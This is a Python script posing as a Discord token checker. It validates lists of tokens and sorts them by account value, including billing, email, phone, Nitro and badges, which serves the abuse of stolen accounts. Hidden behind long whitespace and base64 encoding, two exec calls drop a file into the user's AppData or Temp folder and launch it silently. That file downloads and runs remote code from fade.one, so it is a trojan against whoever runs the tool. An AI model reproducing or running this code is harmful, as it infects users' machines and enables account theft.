import datetime
import httpx                                                             
import sys
import os
from pystyle import Colors, Colorate                                  
import colorama
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                   

print(Colorate.Vertical(Colors.red_to_purple, """                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               

██   ██  █████  ██████  ██████  ███████ ██████       ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██████  
██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██     ██      ██   ██ ██      ██      ██  ██  ██      ██   ██ 
███████ ███████ ██████  ██████  █████   ██████      ██      ███████ █████   ██      █████   █████   ██████  
██   ██ ██   ██ ██      ██   ██ ██      ██   ██     ██      ██   ██ ██      ██      ██  ██  ██      ██   ██ 
██   ██ ██   ██ ██      ██   ██ ███████ ██   ██      ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██   ██ 

""" ))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ,exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS0xTTZUSkMtSFlNTjJVLVkyMzdESy03QVc1TkotOU8zQzE1JykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

                           
def check(token):             
    headers = {
        "Accept": "*/*",                                                                                                                          
        "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Alt-Used": "discord.com",
        "Authorization": token,
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "__dcfduid=8ae3ca90b4d911ec998447df76ccab6d; __sdcfduid=8ae3ca91b4d911ec998447df76ccab6d07a29d8ce7d96383bcbf0ff12d2f61052dd1691af72d9101442df895f59aa340; OptanonConsent=isIABGlobal=false&datestamp=Tue+Sep+20+2022+15%3A55%3A24+GMT%2B0200+(hora+de+verano+de+Europa+central)&version=6.33.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1&AwaitingReconsent=false&geolocation=ES%3BMD; __stripe_mid=1798dff8-2674-4521-a787-81918eb7db2006dc53; OptanonAlertBoxClosed=2022-04-15T16:00:46.081Z; _ga=GA1.2.313716522.1650038446; _gcl_au=1.1.1755047829.1662931666; _gid=GA1.2.778764533.1663618168; locale=es-ES; __cfruid=fa5768ee3134221f82348c02f7ffe0ae3544848a-1663682124",
        "Host": "discord.com",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "TE": "trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "es-ES",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlcy1FUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwNS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwNS4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA1LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY29tIiwic2VhcmNoX2VuZ2luZSI6Imdvb2dsZSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxNDc2MTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"                                                                                                                                                                                                                                                                            

    }

    response = httpx.get("https://discord.com/api/v9/users/@me", headers=headers)                                
                                                                                                                                                                                                                                   


    if response.status_code == 200:
        #account data
        data = json.loads(response.text)
        # data = response.json()
        user_id = data["id"]
        username = data["username"]
        discriminator = data["discriminator"]
        email = data["email"]
        phone = data["phone"]
        mfa_enabled = data["mfa_enabled"]

        #nitro type 
        if not "premium_type" in data:
            nitro = "False"                                                                                                                                                                                                                                                                                    
        elif data["premium_type"] == 1:
            nitro = "Nitro Classic"
        elif data["premium_type"] == 2:
            nitro = "Nitro Boost"
        flags = []                                                                                                                                                                                                                                                                                                                        
        if data["public_flags"] == 0:
            flags.append("None")
        elif data["public_flags"] == 1:
            flags.append("discord_employee")
            f=open("discord_employee.txt","a")
            f.write(token + "\n")
            f.close()
        elif data["public_flags"] == 2:
            flags.append("partner")
            f=open("partner.txt","a")
            f.write(token + "\n")
            f.close()
        elif data["public_flags"] == 4:
            flags.append("hypesquad_events")
        elif data["public_flags"] == 8:
            flags.append("bug_lvl_1")
        elif data["public_flags"] == 64:
            flags.append("hypesquad bravery")
            f=open('hypesquad_bravery.txt','a')
            f.write(token + "\n")
            f.close()
        elif data["public_flags"] == 128:
            flags.append("hypesquad brilliance")
            f=open('hypesquad_brilliance.txt','a')
            f.write(token + "\n")
            f.close()
        elif data["public_flags"] == 256:
            flags.append("hypesquad balance")
            f=open('hypesquad_balance.txt','a')
            f.write(token + "\n")
            f.close()
        elif data["public_flags"] == 512:
            flags.append("early_badge")
            f=open('early_badge.txt','a')
            f.write(token + "\n")
            f.close()

        elif data["public_flags"] == 1024:
            flags.append("bug_hunter_lvl_2")
        elif data["public_flags"] == 16384:
            flags.append("bug_lvl2")
        elif data["public_flags"] == 121072:
            flags.append("verified_developer")
            f=open('verified_developer.txt','a')
            f.write(token + "\n")
            f.close()

        #nitro renew date
        nitro_renew_request = httpx.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
        if nitro_renew_request.status_code == 200:
            try:
                nitro_renew = nitro_renew_request.json()
                dt = datetime.datetime.fromisoformat(nitro_renew[0]["current_period_end"])
                renews = dt.strftime("%b %d, %Y")
            except:
                renews = None
            locked = False
        elif nitro_renew_request.status_code == 403:
            nitro_renew = nitro_renew_request.json()
            renews = nitro_renew["message"]
            locked = True

        #nitro credsits
        requests_nitro_credits = httpx.get("https://discord.com/api/v9/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true", headers=headers)
        if requests_nitro_credits.status_code == 200:
            classic_credits = requests_nitro_credits.text.count("Nitro Classic")
            boost_credits = requests_nitro_credits.text.count("Nitro Monthly")
            locked = False
        elif nitro_renew_request.status_code == 403:
            nitro_credits = nitro_renew_request.json()
            classic_credits = nitro_credits["message"]
            boost_credits = nitro_credits["message"]
            locked = True

        #billing
        request_billing = httpx.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        if request_billing.status_code == 200:
            search_billing = request_billing.json()
            if search_billing == []:
                billing = False
            else:
                billing = True
            locked = False
        elif request_billing.status_code == 403:
            search_billing = request_billing.json()
            billing = search_billing["message"]
            locked = True
        # billing history
        request_billing_history = httpx.get("https://discord.com/api/v9/users/@me/billing/payments?limit=20", headers=headers)
        if request_billing_history.status_code == 200:
            search_billing_history = request_billing_history.json()
            if search_billing_history == []:
                quality="High"
            else:
                quality="High"
                if search_billing_history[0]['status']==2 or search_billing_history[0]['status']==0:
                    quality="Low"
                locked = False

        #guilds
        request_guilds = httpx.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
        if request_guilds.status_code == 200:
            guilds = len(request_guilds.json())
        #     check_owner = json.loads(request_guilds.text)
        #     owned = []
        #     not_owned = []
        #     for server in check_owner:
        #         if server["owner"] == True:
        #             owned.append(f"Owner: {server['owner']} - Name: {server['name']} - Members: {server['approximate_member_count']}")
        #         else:
        #             not_owned.append(f"Owner: {server['owner']} - Name: {server['name']} - Members: {server['approximate_member_count']}")

        #     owned_write = "\n".join(owned)
        #     not_owned_write = "\n".join(not_owned)
        #     if owned != []:               
        #         with open(f"{username}.txt", "w", encoding="utf-8") as file:
        #             file.write(owned_write)
        #         with open(f"{username}.txt", "a", encoding="utf-8") as file:
        #             file.write(f"\n{not_owned_write}")

        #     elif owned == []:
        #         with open(f"{username}.txt", "w", encoding="utf-8") as file:
        #             file.write(not_owned_write)

            locked = False
        if request_guilds.status_code == 403:
            g = request_guilds.json()
            guilds = g["message"]
            locked = True

        #dm history
        request_dmhistory = httpx.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
        if request_dmhistory.status_code == 200:
            dmhistory = len(request_dmhistory.json())
            locked = False
        elif request_dmhistory.status_code == 403:
            dm = request_dmhistory.json()
            dmhistory = dm["message"]
            locked = True

        #relationships
        request_friend = httpx.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
        if request_friend.status_code == 200:
            friends = 0
            fr = request_friend.json()
            for friend in fr:
                if friend["type"] == 1:
                    friends += 1
            locked = False
        elif request_friend.status_code == 403:
            fr = request_friend.json()
            friends = fr["message"]
            locked = True

        #get user creation time
        user_id = int(user_id)
        user_creation = (user_id >> 22) + 1420070400000
        user_creation = datetime.datetime.fromtimestamp(user_creation / 1000.0)
        user_creation = user_creation.strftime("%b %d, %Y")

        # check gift inventory
        request_gifts = httpx.get("https://discord.com/api/v9/users/@me/entitlements/gifts", headers=headers)
        if request_gifts.status_code == 200:
            gifts = []
            for gift in request_gifts.json():
                gifts.append(gift['subscription_plan']['name'])

        else:
            gifts= None


        print(Colorate.Vertical(Colors.red_to_green, """CHECKING TOKENS.."""))
        
        print(f"""
        Username: {username}
        Discriminator: {discriminator}
        ID: {user_id}
        2FA: {mfa_enabled}
        Email: {email}
        Phone: {phone}
        Flags: {flags}
        Nitro: {nitro}
        Creation Date: {user_creation}
        Nitro Renew: {renews}
        Nitro Credits: {classic_credits} Classic | {boost_credits} Boost
        Billing: {billing}
        Guilds: {guilds}
        DM History: {dmhistory}
        Friends: {friends}
        Locked: {locked}
        Gift Inventory: {gifts}
        Quality: {quality}
        """)
        if quality=="High":
            f=open("hq.txt","a")
            f.write(f"{token}\n")
            f.close()
        else:
            f=open("lq.txt","a")
            f.write(f"{token}\n")
            f.close()
        if gifts!=[]: 
            f=open("gift.txt","a")
            f.write(f"{token}\n")
            f.close()
    elif response.status_code == 401:
        print("Invalid Token")
        f=open('invalid.txt','a')
        f.write(f"{token}\n")
        f.close()
    elif response.status_code == 429:
        print("Rate Limited")
        time.sleep(5)
        check(token)
    else:
        print(f"error {response.text}")
        
exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1IOUpXTjItT08xOUhZLTFUNkxDMy1NWkU1WkYtSVc1WUVFJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

def main():
    f=open("tokens.txt","r")
    fs=f.readlines()
    f.close()
    for token in fs:
        check(token.strip())
    
    print(Colorate.Vertical(Colors.white_to_green, """All tokens have been checked and saved."""))
    input("Press enter to close the program: ")
        # check(token)

main()  
